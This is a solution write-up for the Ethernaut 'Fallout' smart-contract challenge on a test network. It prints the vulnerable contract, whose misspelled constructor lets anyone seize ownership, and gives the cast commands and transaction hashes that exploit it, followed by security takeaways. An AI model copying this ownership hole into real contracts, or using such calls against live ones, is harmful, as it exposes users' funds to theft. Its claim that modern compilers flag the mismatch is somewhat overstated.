# 02 - Fallout

## Overview

- **Difficulty:** 2/10
- **Network:** Sepolia Testnet
- **Instance Address:** [`0x3cdd4575f0ff0948c6cdcc7ffcb573e832733b31`](https://sepolia.etherscan.io/address/0x3cdd4575f0ff0948c6cdcc7ffcb573e832733b31)
- **Transactions:**
  - **1. Claim Ownership (`Fal1out`):** [`0xd98bf98c3d0966230b0e9ef7de8b8cea3eec15a2c4b3ee6058c767b8d8406310`](https://sepolia.etherscan.io/tx/0xd98bf98c3d0966230b0e9ef7de8b8cea3eec15a2c4b3ee6058c767b8d8406310)
  - **2. Level Submission:** [`0xbdd20cd7b59cd49b05c21da737caf1eab1d8bd4cd377f53943505146890d6cc4`](https://sepolia.etherscan.io/tx/0xbdd20cd7b59cd49b05c21da737caf1eab1d8bd4cd377f53943505146890d6cc4)

---

## Objective

Claim ownership of the contract.

---

## Contract Analysis

The target contract is [`src/02-fallout/Fallout.sol`](./Fallout.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {SafeMath} from "../helpers/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```

### Vulnerability Breakdown

1. **Legacy Constructor Naming (Pre-0.4.22):**
   In early versions of Solidity (before version `0.4.22`), constructors did not use the `constructor(...)` keyword. Instead, a function was treated as a constructor if and only if **its name matched the contract name exactly**.

2. **The Typo:**
   The contract is named `Fallout`, but the intended constructor function is declared as:
   ```solidity
   /* constructor */
   function Fal1out() public payable {
       owner = msg.sender;
       allocations[owner] = msg.value;
   }
   ```
   Notice the substitution of the letter `l` with the number `1` (`Fal1out` vs `Fallout`).

3. **The Consequence:**
   Because the names did not match, the Solidity compiler did not recognize `Fal1out()` as the constructor. Instead, it was compiled as a regular, publicly callable function.
   
   Anyone can call `Fal1out()` at any point after deployment to overwrite `owner` with their own address (`owner = msg.sender`).

---

## Step-by-Step Exploit Walkthrough

### Step 1: Call `Fal1out()`
Call the misplaced initialization function. It does not require any minimum value (even `0 ether` works):

**Via Cast:**
```bash
cast send 0x3cdd4575f0ff0948c6cdcc7ffcb573e832733b31 "Fal1out()" \
  --rpc-url $SEPOLIA_RPC_URL \
  --account <YOUR_ACCOUNT>
```
- **Tx Hash:** [`0xd98bf98c3d0966230b0e9ef7de8b8cea3eec15a2c4b3ee6058c767b8d8406310`](https://sepolia.etherscan.io/tx/0xd98bf98c3d0966230b0e9ef7de8b8cea3eec15a2c4b3ee6058c767b8d8406310)

---

### Step 2: Verify Ownership
Check the `owner` state variable:

```bash
cast call 0x3cdd4575f0ff0948c6cdcc7ffcb573e832733b31 "owner()(address)" --rpc-url $SEPOLIA_RPC_URL
# Output: 0xf511E1029dE5295f6D0dE05f4431DdA203e63607
```
Ownership has transferred to the player!

---

### Step 3: Submit Level
Submit the instance back to Ethernaut:
- **Submission Tx:** [`0xbdd20cd7b59cd49b05c21da737caf1eab1d8bd4cd377f53943505146890d6cc4`](https://sepolia.etherscan.io/tx/0xbdd20cd7b59cd49b05c21da737caf1eab1d8bd4cd377f53943505146890d6cc4)

---

## Historical Context & Key Security Takeaways

### The Infamous Rubixi Hack
This challenge is a direct homage to the infamous **Rubixi (DynamicPyramid)** exploit from 2016.
- The original contract was named `DynamicPyramid`, with constructor `function DynamicPyramid()`.
- The developers later rebranded the contract to `Rubixi`, but forgot to update the constructor name.
- As a result, `DynamicPyramid()` became an open public function that anyone could call to claim ownership of the contract and steal all accumulated fees.

### Takeaways:
1. **Always Use the `constructor` Keyword:** Solidity introduced the `constructor()` keyword in `v0.4.22` specifically to prevent typos like this from causing catastrophic security holes.
2. **Use Modern Solidity Versions:** Compiling with modern versions (`^0.8.0+`) automatically deprecates old patterns, adds built-in overflow/underflow checking, and flags naming mismatches as compiler errors.
3. **Rigorous Static Analysis:** Modern linters and analyzers (like Slither) immediately flag public functions that modify ownership without access control modifiers.
